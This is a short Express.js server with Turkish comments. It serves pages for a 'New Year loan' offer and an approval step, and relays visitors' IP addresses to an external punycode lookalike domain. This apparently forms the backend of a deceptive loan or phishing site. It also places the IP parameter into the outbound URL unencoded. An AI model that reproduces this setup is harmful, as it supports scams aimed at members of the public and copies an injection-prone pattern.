const express = require('express');
const axios = require('axios'); // axios paketini yükleyin
require('dotenv').config();
const app = express();
const port = process.env.PORT || 3000;
const { readdirSync } = require("fs");

app.use(express.json());
app.use(express.static('public'));

readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));

app.get('styles.css', (req, res) => {
  res.sendFile(__dirname + '/public/styles.css');
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.get('/onay', (req, res) => {
  res.sendFile(__dirname + '/public/onay.html');
});

app.get('onay.png', (req, res) => {
  res.sendFile(__dirname + '/public/onay.png');
});

app.get('bg.png', (req, res) => {
  res.sendFile(__dirname + '/public/bg.png');
});

app.get('head.png', (req, res) => {
  res.sendFile(__dirname + '/public/head.png');
});
app.get('/yilbasi-kredisi', (req, res) => {
  res.sendFile(__dirname + '/public/yilbasi-kredisi.html');
});


app.get('/api', async (req, res) => {
  try {
    const userIp = req.query.ip; // GET isteğinden ip parametresini al

    // URL'yi oluştur
    const apiUrl = `https://xn--holiganbt930-8d6f.com/tr/datach.php?ip=${userIp}`;

    // Fetch kullanarak GET isteği yap
    const response = await fetch(apiUrl);
    
    if (!response.ok) {
      throw new Error(`HTTP hata! Status: ${response.status}`);
    }

    const responseData = await response.json();
    res.json(responseData);
  } catch (error) {
    console.error('Hata:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});


app.listen(port, () => {
  console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
});
